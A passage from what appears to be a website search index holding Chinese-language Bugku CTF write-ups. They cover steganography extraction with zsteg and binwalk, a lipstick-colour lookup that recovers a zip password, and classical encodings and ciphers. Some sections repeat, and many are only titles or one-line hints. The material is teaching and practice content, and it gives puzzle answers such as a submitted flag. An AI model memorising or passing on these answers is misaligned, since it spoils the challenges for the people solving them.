70 42 67 4c 37 20 ff 48 4d |.......pBgL7 .HM| 00000090: 00 00 00 43 00 00 00 08 00 24 00 00 00 00 00 00 |...C.....$......| 000000a0: 00 20 00 00 00 00 00 00 00 66 6c 61 67 2e 74 78 |. .......flag.tx| 000000b0: 74 0a 00 20 00 00 00 00 00 01 00 18 00 5b d9 a1 |t.. .........[..| 000000c0: f6 a9 b5 d3 01 a5 f5 f6 76 a9 b5 d3 01 a5 f5 f6 |........v.......| 000000d0: 76 a9 b5 d3 01 50 4b 05 06 00 00 00 00 01 00 01 |v....PK.........| 000000e0: 00 5a 00 00 00 73 00 00 00 00 00 92 49 24 92 49 |.Z...s......I$.I| 000000f0: 24 92 49 24 92 49 24 92 49 24 92 49 24 92 49 24 |$.I$.I$.I$.I$.I$| On the top there's PK, that's the magic byte for zip! A zip hidden in lsb. (\u602a\u4e0d\u5f97binwalk\u63d0\u53d6\u4e0d\u51fa\u6765) 1 2 3 4 5 6 7 8 9 10 $ zsteg 603fda27-2893-4e60-9d9f-39962b8c8440.png -E b1,bgr,lsb,xy > out $ binwalk -e out $ cd _out.extracted $ 7z l 8.zip Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2018-03-06 17:19:31 ....A 67 77 flag.txt ------------------- ----- ------------ ------------ ------------------------ 2018-03-06 17:19:31 67 77 1 files \u538b\u7f29\u5305\u6709\u5bc6\u7801\u3002 Looking through the color channels again in StegSolve, this turns up: YSL: Yves Saint Laurent. A recognizable fashion brand which sells lipstick. This may lead us to something predictable! \u67e5\u627e\u53e3\u7ea2\u8272\u53f7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 { \"rgb(188, 11, 40)\" : \"1 Le Rouge - Blood Red (Satin)\" , \"rgb(184, 52, 75)\" : \"04 Rouge Vermillon - Raspberry Red (Satin)\" , \"rgb(221, 136, 133)\" : \"06 Rose Bergamasque - Delicate Nude Pink (Satin)\" , \"rgb(207, 26, 119)\" : \"7 Le Fuchsia - Pure Saturated Fuschia (Satin)\" , \"rgb(206, 135, 133)\" : \"10 Beige Tribute - Dark Nude (Satin)\" , \"rgb(194, 105, 111)\" : \"11 Rose Carnation - Soft Peony Rose (Satin)\" , \"rgb(213, 29, 55)\" : \"13 Le Orange - Bright Orange (Satin)\" , \"rgb(234, 94, 107)\" : \"17 Rose Dahlia - Coral Orange (Satin)\" , \"rgb(161, 24, 96)\" : \"19 Fuchsia Pink - Bright Fuschia Pink (Satin)\" , \"rgb(238, 133, 199)\" : \"22 Pink Celebration - Bubble Gum Pink (Satin)\" , \"rgb(235, 130, 98)\" : \"23 Coral Poetique - Pink Coral (Satin)\" , \"rgb(233, 152, 131)\" : \"24 Blond Ingenu - Frosted Coral (Satin)\" , \"rgb(218, 116, 155)\" : \"26 Rose Libertin - Bright Purple Pink (Satin)\" , \"rgb(208, 65, 121)\" : \"27 Fuchsia Innocent - Hot Pink (Satin)\" , \"rgb(235, 105, 92)\" : \"36 Corail Legende - Orange Coral (Satin)\" , \"rgb(202, 102, 174)\" : \"49 Tropical Pink - Hot Pink (Satin)\" , \"rgb(212, 18, 29)\" : \"50 Rouge Neon - Bright Red (Satin)\" , \"rgb(235, 85, 71)\" : \"51 Corail Urbain - Medium Peach Orange (Satin)\" , \"rgb(246, 98, 96)\" : \"52 Rosy Coral - Rosy Coral (Satin)\" , \"rgb(126, 69, 58)\" : \"53 Beige Promenade - Browd Red (Satin)\" , \"rgb(94, 35, 41)\" : \"54 Prune Avenue - Dark Maroon (Satin)\" , \"rgb(193, 9, 43)\" : \"56 Orange Indie - Mauve (Satin)\" , \"rgb(192, 8, 62)\" : \"57 Luminous Pink - Magenta (Satin)\" , \"rgb(165, 63, 103)\" : \"58 Luminous Mauve - Bubblegum Pink (Satin)\" , \"rgb(212, 122, 111)\" : \"59 Golden Melon - Golden Orange (Satin)\" , \"rgb(170, 64, 64)\" : \"66 Rosewood - Soft Pink Nude (Satin)\" , \"rgb(220, 53, 77)\" : \"67 Rouge Heroine - Gold Metallic (Satin)\" , \"rgb(203, 132, 123)\" : \"70 Le Nu - Basic Nude (Satin)\" , \"rgb(148, 23, 41)\" : \"72 Rouge Vinyle - Deep Raspberry (Satin)\" , \"rgb(215, 11, 22)\" : \"73 Rhythm Red - Magenta Pink (Satin)\" , \"rgb(229, 35, 23)\" : \"74 Orange Electro - Electric Orange (Satin)\" , \"rgb(183, 48, 62)\" : \"75 Rose Mix - Deep Rose (Satin)\" , \"rgb(209, 50, 116)\" : \"76 Explicit Pink - Spring Pink (Satin)\" , \"rgb(206, 10, 74)\" : \"77 Fuschia Live - Blush Rose (Satin)\" , \"rgb(161, 0, 6)\" : \"201 Orange Imagine - Orange Red (Matte)\" , \"rgb(161, 0, 52)\" : \"202 Rose Crazy - Cranberry Red (Matte)\" , \"rgb(167, 11, 35)\" : \"203 Rouge Rock - Rich Red (Matte)\" , \"rgb(131, 35, 37)\" : \"204 Rouge Scandal - Maroon Red (Matte)\" , \"rgb(97, 37, 29)\" : \"206 Grenat Satisfaction - Brown Red (Matte)\" , \"rgb(184, 20, 70)\" : \"208 Fuchsia Fetiche - Raspberry Red (Matte)\" , \"rgb(231, 51, 37)\" : \"213 Orange Seventies - Orange with Brown undertones (Matte)\" , \"rgb(215, 91, 89)\" : \"214 Wood On Fire - Pinky Nude (Matte)\" , \"rgb(184, 38, 59)\" : \"216 Red Clash - Mauvey Red (Matte)\" , \"rgb(201, 88, 108)\" : \"217 Nude Trouble - Mauvey Beige (Matte)\" , \"rgb(203, 93, 70)\" : \"218 Coral Remix - Coral Nude (Matte)\" , \"rgb(195, 1, 9)\" : \"219 Rouge Tatouage \u2013 Vibrant Pink Red (Matte)\" , \"rgb(230, 26, 1)\" : \"220 Crazy Tangerine \u2013 Electric Orange (Matte)\" , \"rgb(106, 19, 25)\" : \"222 Black Red Code \u2013 Rust Red (Matte)\" , \"rgb(51, 26, 19)\" : \"225 - Minimal Black - Matte Finish - Black (Matte)\" , \"rgb(165, 106, 92)\" : \"340 Golden Copper - Reddish Pink (Satin)\" , \"rgb(163, 77, 86)\" : \"09 Rose Stiletto - Rich Berry Rose (Satin)\" , \"rgb(92, 47, 44)\" : \"205 Prune Virgin - Burgundy (Matte)\" , \"rgb(174, 67, 95)\" : \"207 Rose Perfecto - Blush Pink (Matte)\" , \"rgb(226, 0, 74)\" : \"211 Decadent Pink - Bright Pink (Matte)\" , \"rgb(126, 32, 50)\" : \"212 Alternative Plum - Burgundy Wine (Matte)\" , \"rgb(207, 44, 125)\" : \"215 Lust For Pink - Purple Bubblegum Pink (Matte)\" , \"rgb(214, 0, 112)\" : \"221 Rose Ink \u2013 Deep Mauve Pink (Matte)\" , \"rgb(232, 11, 44)\" : \"223 Corail Anti-Mainstream \u2013 Neon Coral (Matte)\" , \"rgb(219, 90, 121)\" : \"224 Rose Illicite \u2013 Creamy Dusty Pink (Matte)\" } \u53d6\u8272\uff1a 1 2 3 4 5 6 7 8 from PIL import Image im = Image . open ( '603fda27-2893-4e60-9d9f-39962b8c8440.png' ) rgb_im = im . convert ( 'RGB' ) for x in range ( 0 , 21 ): r , g , b = rgb_im . getpixel (( 50 + ( 150 * x ), 1 )) print ( r , g , b ) \u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 (188, 11, 40) (208, 65, 121) (212, 122, 111) (194, 105, 111) (235, 130, 98) (207, 26, 119) (192, 8, 62) (188, 11, 40) (188, 11, 40) (209, 50, 116) (106, 19, 25) (188, 11, 40) (188, 11, 40) (212, 18, 29) (215, 91, 89) (221, 136, 133) (206, 10, 74) (212, 18, 29) (126, 69, 58) (215, 91, 89) (221, 136, 133) \u67e5\u627e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $ IFS=$'\\n'; for i in `cat image-colors` ; do grep $i ./lipsticks.json >> found; done $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' 1 27 59 11 23 7 57 1 1 76 222 1 1 50 214 6 77 50 53 214 6 $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' | tr -d '\\n' 1275911237571176222115021467750532146 1 2 $ cat found | cut -d: -f1 | xargs python -c 'import sys; print \"\".join([bin(int(x)).lstrip(\"0b\") for x in sys.argv[1:]])' 1011111101011111001011100010101000101100011010100101010111001000111001010101101011100 1 2 $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' | xargs python -c 'import sys; print \"\".join([bin(int(x)).lstrip(\"0b\") for x in sys.argv[1:]])' | perl -lpe '$_=pack\"B*\",$_' \u767d\u5b66\u5bb6 \u6700\u540e\u5f97\u5230\u5bc6\u7801 \u544a\u8bc9\u4f60\u4e2a\u79d8\u5bc6(ISCCCTF) \u00b6 636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067 \u5341\u516d\u8fdb\u5236\u89e3\u7801\uff1a 1 cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g base64\u89e3\u7801 1 r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM \u8fd9\u4e32\u4e1c\u897f\u5c31\u9700\u8981\u4e00\u70b9\u8111\u6d1e\uff0c\u8fd9\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u5bf9\u7167\u7740\u952e\u76d8\uff0c\u6bd4\u5982r5yg\uff0c\u56f4\u8d77\u6765\u7684\u662ft\uff0clp9i\u56f4\u8d77\u6765\u7684\u662fo\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6700\u540e\u5f97\u51fatongyuan\uff08\u63d0\u4ea4flag\u7684\u65f6\u5019\u63d0\u4ea4\u5927\u5199\u7684TONGYUAN\uff09 \u8fd9\u4e0d\u662fmd5 \u00b6 \u8d1d\u65af\u5bb6\u65cf \u00b6 @iH<,{bdR2H;i6*Tm,Wx2izpx2! \u5206\u6790\uff1a\u9898\u76ee\u8bf4\u662f\u8d1d\u65af(base)\uff0c\u90a3\u5e94\u8be5\u662fbase\u7f16\u7801\u4e4b\u7c7b\u7684\uff0c\u7136\u540e\u6211\u8bd5\u4e86\u4e0bbase64\uff0c\u53d1\u73b0\u4e0d\u5bf9\uff0c\u540e\u6765\u4e86\u89e3\u5230base\u7f16\u7801\u4e0d\u6b62\u6709base64\uff0c\u8fd8\u6709base16,base32\uff0cbase58\uff0cbase62\uff0cbase91\u7b49\uff0c\u90fd\u8bd5\u4e86\u4e00\u904d\uff0c\u53d1\u73b0\u8fd9\u9898\u662f\u7528base91\u89e3\u7801 Github\u4e0a\u627e\u5230\u7684js \u4ee3\u7801 \u5bcc\u5f3a\u6c11\u4e3b \u00b6 \u6765\u81ea\u5b87\u5b99\u7684\u4fe1\u53f7 \u00b6 \u8fd9\u79cd\u4e1c\u897f\u53eb\u6807\u51c6\u94f6\u6cb3\u5b57\u6bcd\uff0c\u767e\u5ea6\u627e\u5230\u5bf9\u7167\u8868 \u6ef4\u7b54~\u6ef4 \u00b6 \u5bc6\u6587\uff1a -... -.- -.-. - ..-. -- .. ... -.-. \u806a\u660e\u7684\u5c0f\u7f8a \u00b6 \u6805\u680f\u5bc6\u7801\u89e3\u5bc6 ok \u00b6 \u8fd9\u4e0d\u662f\u83ab\u5c14\u65af\u5bc6\u7801 \u00b6 easy Crypto \u00b6 \u7b80\u5355\u52a0\u5bc6 \u00b6 \u4e00\u4e2a\u4e2a\u8bd5\u4e00\u4e0b\u5427 \u6765\u81ea\u4e4c\u4e91\u7684\u9080\u8bf7\u7801 \u00b6 \u4e00\u5f20\u56fe\u7247\uff1a \u795e\u79d8\u7684\u6587\u4ef6 \u00b6 zip\u7684\u660e\u6587\u653b\u51fb \u8bba\u5251 \u00b6 jpg\u683c\u5f0f\uff0cstrings\u770b\u5230\u4e00\u4e32\u4e8c\u8fdb\u5236\u7684\u6570\u636e burp\u53ef\u4ee5\u5b9e\u73b0\u8fde\u7eed\u7684\u52a0\u5bc6\u548c\u89e3\u5bc6 misc \u00b6 \u9690\u5199 \u00b6 \u4fee\u6539\u9ad8\u5ea6 telnet \u00b6 \u7b80\u5355\u5730\u6d41\u91cf\u5206\u6790 \u773c\u89c1\u975e\u5b9e \u00b6 \u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\uff0cfile\u67e5\u770b\u683c\u5f0f\u77e5\u9053\u662fzip\uff0c\u89e3\u538b\u7f29\u4e4b\u540e\u53c8\u662fword\uff0c \u89e3\u538b\u540e\u53bb\u627e\u5c31\u884c \u554a\u54d2 \u00b6 binwalk \u56fe\u7247\u5c5e\u6027\u6709\u5bc6\u7801 \u53c8\u4e00\u5f20\u56fe\u7247 \u00b6 foremost \u00b6 \u53c2\u8003 \u00b6 \u591a\u5f69wp wp wp","title":"bugku"},{"location":"writeup/bugku/#bugku","text":"","title":"bugku"},{"location":"writeup/bugku/#_1","text":"zsteg \u63d0\u53d6\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ zsteg -a 603fda27-2893-4e60-9d9f-39962b8c8440.png b1,bgr,lsb,xy .. text: \"flag.txt\" b2,g,lsb,xy .. file: 5View capture file b2,g,msb,xy .. file: VISX image file b2,b,msb,xy .. text: \"UUuUUWUUUUUuUUUU\" b2,bgr,lsb,xy .. text: \"AAAP@QUDQ\" b3,b,lsb,xy .. file: GLS_BINARY_MSB_FIRST b4,r,lsb,xy .. text: \"UDTTUEEDDEDEUEDDTEDETDEDDEDDDDTDUEEETDUDEUDDDDDDDDDDDDUDDDDDDDDDDDDDDDDDDDD\\\"322\\\"223##\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"#\\\"#\\\"\\\"\\\"3\\\"#\" b4,r,msb,xy .. text: \"333333333;\" b4,g,lsb,xy .. file: 5View capture file b4,g,msb,xy .. file: VISX image file b4,b,msb,xy .. text: [\"w\" repeated 12 times] b6,g,msb,xy .. text: \"4ES4EQ4MS4M\" Passing the -v flag into zsteg, we can get the hex dump of that extraction: \u63d0\u53d6 flag.txt \u5904\u7684\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 zsteg -v 603fda27-2893-4e60-9d9f-39962b8c8440.png b1,bgr,lsb,xy b1,bgr,lsb,xy .. text: \"flag.txt\" 00000000: 00 00 00 00 00 00 00 e3 50 4b 03 04 14 00 01 08 |........PK......| 00000010: 08 00 70 42 67 4c 37 20 ff 48 4d 00 00 00 43 00 |..pBgL7 .HM...C.| 00000020: 00 00 08 00 00 00 66 6c 61 67 2e 74 78 74 ce 98 |......flag.txt..| 00000030: 5e 65 7a ba 27 91 a6 eb 1b 25 54 f3 b9 6d 0f ca |^ez.'....%T..m..| 00000040: 78 7c 20 6a 79 e8 39 99 c8 df ad 3d 9a c8 4b fc |x| jy.9....=..K.| 00000050: 53 1d db 6e 95 9d 07 ae 1c 91 eb fe a7 18 33 00 |S..n..........3.| 00000060: 9e f5 12 8e 7f c6 e6 7e 1a c8 3d cf 94 97 2f b0 |.......~..=.../.| 00000070: 96 64 f3 a7 d1 94 64 23 98 3f 47 50 4b 01 02 3f |.d....d#.?GPK..?| 00000080: 00 14 00 01 08 08 00 70 42 67 4c 37 20 ff 48 4d |.......pBgL7 .HM| 00000090: 00 00 00 43 00 00 00 08 00 24 00 00 00 00 00 00 |...C.....$......| 000000a0: 00 20 00 00 00 00 00 00 00 66 6c 61 67 2e 74 78 |. .......flag.tx| 000000b0: 74 0a 00 20 00 00 00 00 00 01 00 18 00 5b d9 a1 |t.. .........[..| 000000c0: f6 a9 b5 d3 01 a5 f5 f6 76 a9 b5 d3 01 a5 f5 f6 |........v.......| 000000d0: 76 a9 b5 d3 01 50 4b 05 06 00 00 00 00 01 00 01 |v....PK.........| 000000e0: 00 5a 00 00 00 73 00 00 00 00 00 92 49 24 92 49 |.Z...s......I$.I| 000000f0: 24 92 49 24 92 49 24 92 49 24 92 49 24 92 49 24 |$.I$.I$.I$.I$.I$| On the top there's PK, that's the magic byte for zip! A zip hidden in lsb. (\u602a\u4e0d\u5f97binwalk\u63d0\u53d6\u4e0d\u51fa\u6765) 1 2 3 4 5 6 7 8 9 10 $ zsteg 603fda27-2893-4e60-9d9f-39962b8c8440.png -E b1,bgr,lsb,xy > out $ binwalk -e out $ cd _out.extracted $ 7z l 8.zip Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2018-03-06 17:19:31 ....A 67 77 flag.txt ------------------- ----- ------------ ------------ ------------------------ 2018-03-06 17:19:31 67 77 1 files \u538b\u7f29\u5305\u6709\u5bc6\u7801\u3002 Looking through the color channels again in StegSolve, this turns up: YSL: Yves Saint Laurent. A recognizable fashion brand which sells lipstick. This may lead us to something predictable! \u67e5\u627e\u53e3\u7ea2\u8272\u53f7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 { \"rgb(188, 11, 40)\" : \"1 Le Rouge - Blood Red (Satin)\" , \"rgb(184, 52, 75)\" : \"04 Rouge Vermillon - Raspberry Red (Satin)\" , \"rgb(221, 136, 133)\" : \"06 Rose Bergamasque - Delicate Nude Pink (Satin)\" , \"rgb(207, 26, 119)\" : \"7 Le Fuchsia - Pure Saturated Fuschia (Satin)\" , \"rgb(206, 135, 133)\" : \"10 Beige Tribute - Dark Nude (Satin)\" , \"rgb(194, 105, 111)\" : \"11 Rose Carnation - Soft Peony Rose (Satin)\" , \"rgb(213, 29, 55)\" : \"13 Le Orange - Bright Orange (Satin)\" , \"rgb(234, 94, 107)\" : \"17 Rose Dahlia - Coral Orange (Satin)\" , \"rgb(161, 24, 96)\" : \"19 Fuchsia Pink - Bright Fuschia Pink (Satin)\" , \"rgb(238, 133, 199)\" : \"22 Pink Celebration - Bubble Gum Pink (Satin)\" , \"rgb(235, 130, 98)\" : \"23 Coral Poetique - Pink Coral (Satin)\" , \"rgb(233, 152, 131)\" : \"24 Blond Ingenu - Frosted Coral (Satin)\" , \"rgb(218, 116, 155)\" : \"26 Rose Libertin - Bright Purple Pink (Satin)\" , \"rgb(208, 65, 121)\" : \"27 Fuchsia Innocent - Hot Pink (Satin)\" , \"rgb(235, 105, 92)\" : \"36 Corail Legende - Orange Coral (Satin)\" , \"rgb(202, 102, 174)\" : \"49 Tropical Pink - Hot Pink (Satin)\" , \"rgb(212, 18, 29)\" : \"50 Rouge Neon - Bright Red (Satin)\" , \"rgb(235, 85, 71)\" : \"51 Corail Urbain - Medium Peach Orange (Satin)\" , \"rgb(246, 98, 96)\" : \"52 Rosy Coral - Rosy Coral (Satin)\" , \"rgb(126, 69, 58)\" : \"53 Beige Promenade - Browd Red (Satin)\" , \"rgb(94, 35, 41)\" : \"54 Prune Avenue - Dark Maroon (Satin)\" , \"rgb(193, 9, 43)\" : \"56 Orange Indie - Mauve (Satin)\" , \"rgb(192, 8, 62)\" : \"57 Luminous Pink - Magenta (Satin)\" , \"rgb(165, 63, 103)\" : \"58 Luminous Mauve - Bubblegum Pink (Satin)\" , \"rgb(212, 122, 111)\" : \"59 Golden Melon - Golden Orange (Satin)\" , \"rgb(170, 64, 64)\" : \"66 Rosewood - Soft Pink Nude (Satin)\" , \"rgb(220, 53, 77)\" : \"67 Rouge Heroine - Gold Metallic (Satin)\" , \"rgb(203, 132, 123)\" : \"70 Le Nu - Basic Nude (Satin)\" , \"rgb(148, 23, 41)\" : \"72 Rouge Vinyle - Deep Raspberry (Satin)\" , \"rgb(215, 11, 22)\" : \"73 Rhythm Red - Magenta Pink (Satin)\" , \"rgb(229, 35, 23)\" : \"74 Orange Electro - Electric Orange (Satin)\" , \"rgb(183, 48, 62)\" : \"75 Rose Mix - Deep Rose (Satin)\" , \"rgb(209, 50, 116)\" : \"76 Explicit Pink - Spring Pink (Satin)\" , \"rgb(206, 10, 74)\" : \"77 Fuschia Live - Blush Rose (Satin)\" , \"rgb(161, 0, 6)\" : \"201 Orange Imagine - Orange Red (Matte)\" , \"rgb(161, 0, 52)\" : \"202 Rose Crazy - Cranberry Red (Matte)\" , \"rgb(167, 11, 35)\" : \"203 Rouge Rock - Rich Red (Matte)\" , \"rgb(131, 35, 37)\" : \"204 Rouge Scandal - Maroon Red (Matte)\" , \"rgb(97, 37, 29)\" : \"206 Grenat Satisfaction - Brown Red (Matte)\" , \"rgb(184, 20, 70)\" : \"208 Fuchsia Fetiche - Raspberry Red (Matte)\" , \"rgb(231, 51, 37)\" : \"213 Orange Seventies - Orange with Brown undertones (Matte)\" , \"rgb(215, 91, 89)\" : \"214 Wood On Fire - Pinky Nude (Matte)\" , \"rgb(184, 38, 59)\" : \"216 Red Clash - Mauvey Red (Matte)\" , \"rgb(201, 88, 108)\" : \"217 Nude Trouble - Mauvey Beige (Matte)\" , \"rgb(203, 93, 70)\" : \"218 Coral Remix - Coral Nude (Matte)\" , \"rgb(195, 1, 9)\" : \"219 Rouge Tatouage \u2013 Vibrant Pink Red (Matte)\" , \"rgb(230, 26, 1)\" : \"220 Crazy Tangerine \u2013 Electric Orange (Matte)\" , \"rgb(106, 19, 25)\" : \"222 Black Red Code \u2013 Rust Red (Matte)\" , \"rgb(51, 26, 19)\" : \"225 - Minimal Black - Matte Finish - Black (Matte)\" , \"rgb(165, 106, 92)\" : \"340 Golden Copper - Reddish Pink (Satin)\" , \"rgb(163, 77, 86)\" : \"09 Rose Stiletto - Rich Berry Rose (Satin)\" , \"rgb(92, 47, 44)\" : \"205 Prune Virgin - Burgundy (Matte)\" , \"rgb(174, 67, 95)\" : \"207 Rose Perfecto - Blush Pink (Matte)\" , \"rgb(226, 0, 74)\" : \"211 Decadent Pink - Bright Pink (Matte)\" , \"rgb(126, 32, 50)\" : \"212 Alternative Plum - Burgundy Wine (Matte)\" , \"rgb(207, 44, 125)\" : \"215 Lust For Pink - Purple Bubblegum Pink (Matte)\" , \"rgb(214, 0, 112)\" : \"221 Rose Ink \u2013 Deep Mauve Pink (Matte)\" , \"rgb(232, 11, 44)\" : \"223 Corail Anti-Mainstream \u2013 Neon Coral (Matte)\" , \"rgb(219, 90, 121)\" : \"224 Rose Illicite \u2013 Creamy Dusty Pink (Matte)\" } \u53d6\u8272\uff1a 1 2 3 4 5 6 7 8 from PIL import Image im = Image . open ( '603fda27-2893-4e60-9d9f-39962b8c8440.png' ) rgb_im = im . convert ( 'RGB' ) for x in range ( 0 , 21 ): r , g , b = rgb_im . getpixel (( 50 + ( 150 * x ), 1 )) print ( r , g , b ) \u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 (188, 11, 40) (208, 65, 121) (212, 122, 111) (194, 105, 111) (235, 130, 98) (207, 26, 119) (192, 8, 62) (188, 11, 40) (188, 11, 40) (209, 50, 116) (106, 19, 25) (188, 11, 40) (188, 11, 40) (212, 18, 29) (215, 91, 89) (221, 136, 133) (206, 10, 74) (212, 18, 29) (126, 69, 58) (215, 91, 89) (221, 136, 133) \u67e5\u627e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $ IFS=$'\\n'; for i in `cat image-colors` ; do grep $i ./lipsticks.json >> found; done $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' 1 27 59 11 23 7 57 1 1 76 222 1 1 50 214 6 77 50 53 214 6 $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' | tr -d '\\n' 1275911237571176222115021467750532146 1 2 $ cat found | cut -d: -f1 | xargs python -c 'import sys; print \"\".join([bin(int(x)).lstrip(\"0b\") for x in sys.argv[1:]])' 1011111101011111001011100010101000101100011010100101010111001000111001010101101011100 1 2 $ cat found | sed 's/.*: \"//g;s/ .*//;s/^0*//' | xargs python -c 'import sys; print \"\".join([bin(int(x)).lstrip(\"0b\") for x in sys.argv[1:]])' | perl -lpe '$_=pack\"B*\",$_' \u767d\u5b66\u5bb6 \u6700\u540e\u5f97\u5230\u5bc6\u7801","title":"\u591a\u5f69"},{"location":"writeup/bugku/#isccctf","text":"636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067 \u5341\u516d\u8fdb\u5236\u89e3\u7801\uff1a 1 cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g base64\u89e3\u7801 1 r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM \u8fd9\u4e32\u4e1c\u897f\u5c31\u9700\u8981\u4e00\u70b9\u8111\u6d1e\uff0c\u8fd9\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u5bf9\u7167\u7740\u952e\u76d8\uff0c\u6bd4\u5982r5yg\uff0c\u56f4\u8d77\u6765\u7684\u662ft\uff0clp9i\u56f4\u8d77\u6765\u7684\u662fo\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6700\u540e\u5f97\u51fatongyuan\uff08\u63d0\u4ea4flag\u7684\u65f6\u5019\u63d0\u4ea4\u5927\u5199\u7684TONGYUAN\uff09","title":"\u544a\u8bc9\u4f60\u4e2a\u79d8\u5bc6(ISCCCTF)"},{"location":"writeup/bugku/#md5","text":"","title":"\u8fd9\u4e0d\u662fmd5"},{"location":"writeup/bugku/#_2","text":"@iH<,{bdR2H;i6*Tm,Wx2izpx2! \u5206\u6790\uff1a\u9898\u76ee\u8bf4\u662f\u8d1d\u65af(base)\uff0c\u90a3\u5e94\u8be5\u662fbase\u7f16\u7801\u4e4b\u7c7b\u7684\uff0c\u7136\u540e\u6211\u8bd5\u4e86\u4e0bbase64\uff0c\u53d1\u73b0\u4e0d\u5bf9\uff0c\u540e\u6765\u4e86\u89e3\u5230base\u7f16\u7801\u4e0d\u6b62\u6709base64\uff0c\u8fd8\u6709base16,base32\uff0cbase58\uff0cbase62\uff0cbase91\u7b49\uff0c\u90fd\u8bd5\u4e86\u4e00\u904d\uff0c\u53d1\u73b0\u8fd9\u9898\u662f\u7528base91\u89e3\u7801 Github\u4e0a\u627e\u5230\u7684js \u4ee3\u7801","title":"\u8d1d\u65af\u5bb6\u65cf"},{"location":"writeup/bugku/#_3","text":"","title":"\u5bcc\u5f3a\u6c11\u4e3b"},{"location":"writeup/bugku/#_4","text":"\u8fd9\u79cd\u4e1c\u897f\u53eb\u6807\u51c6\u94f6\u6cb3\u5b57\u6bcd\uff0c\u767e\u5ea6\u627e\u5230\u5bf9\u7167\u8868","title":"\u6765\u81ea\u5b87\u5b99\u7684\u4fe1\u53f7"},{"location":"writeup/bugku/#_5","text":"\u5bc6\u6587\uff1a -... -.- -.-. - ..-. -- .. ... -.-.","title":"\u6ef4\u7b54~\u6ef4"},{"location":"writeup/bugku/#_6","text":"\u6805\u680f\u5bc6\u7801\u89e3\u5bc6","title":"\u806a\u660e\u7684\u5c0f\u7f8a"},{"location":"writeup/bugku/#ok","text":"","title":"ok"},{"location":"writeup/bugku/#_7","text":"","title":"\u8fd9\u4e0d\u662f\u83ab\u5c14\u65af\u5bc6\u7801"},{"location":"writeup/bugku/#easy-crypto","text":"","title":"easy Crypto"},{"location":"writeup/bugku/#_8","text":"\u4e00\u4e2a\u4e2a\u8bd5\u4e00\u4e0b\u5427","title":"\u7b80\u5355\u52a0\u5bc6"},{"location":"writeup/bugku/#_9","text":"\u4e00\u5f20\u56fe\u7247\uff1a","title":"\u6765\u81ea\u4e4c\u4e91\u7684\u9080\u8bf7\u7801"},{"location":"writeup/bugku/#_10","text":"zip\u7684\u660e\u6587\u653b\u51fb","title":"\u795e\u79d8\u7684\u6587\u4ef6"},{"location":"writeup/bugku/#_11","text":"jpg\u683c\u5f0f\uff0cstrings\u770b\u5230\u4e00\u4e32\u4e8c\u8fdb\u5236\u7684\u6570\u636e burp\u53ef\u4ee5\u5b9e\u73b0\u8fde\u7eed\u7684\u52a0\u5bc6\u548c\u89e3\u5bc6","title":"\u8bba\u5251"},{"location":"writeup/bugku/#misc","text":"","title":"misc"},{"location":"writeup/bugku/#_12","text":"\u4fee\u6539\u9ad8\u5ea6","title":"\u9690\u5199"},{"location":"writeup/bugku/#telnet","text":"\u7b80\u5355\u5730\u6d41\u91cf\u5206\u6790","title":"telnet"},{"location":"writeup/bugku/#_13","text":"\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\uff0cfile\u67e5\u770b\u683c\u5f0f\u77e5\u9053\u662fzip\uff0c\u89e3\u538b\u7f29\u4e4b\u540e\u53c8\u662fword\uff0c \u89e3\u538b\u540e\u53bb\u627e\u5c31\u884c","title":"\u773c\u89c1\u975e\u5b9e"},{"location":"writeup/bugku/#_14","text":"binwalk \u56fe\u7247\u5c5e\u6027\u6709\u5bc6\u7801","title":"\u554a\u54d2"},{"location":"writeup/bugku/#_15","text":"foremost","title":"\u53c8\u4e00\u5f20\u56fe\u7247"},{"location":"writeup/bugku/#_17","text":"\u591a\u5f69wp wp wp","title":"\u53c2\u8003"},{"location":"writeup/dianfengjike2018/","text":"\u5dc5\u5cf0\u6781\u5ba2 \u00b6 warmup \u00b6 LSB\u9690\u5199 \u00b6 \u8fd9\u90e8\u5206\u77e5\u8bc6\u5c31\u4e0d\u7ec6\u8bf4\u4e86 \u5b9a\u4f4d\u9690\u5199\u70b9 \u00b6 \u6d4f\u89c8\u4e0d\u540c\u7684\u901a\u9053 Red plane 0 Green plane 0 Blue plane 0 \u6458\u53d6\u9690\u5199\u4fe1\u606f \u00b6 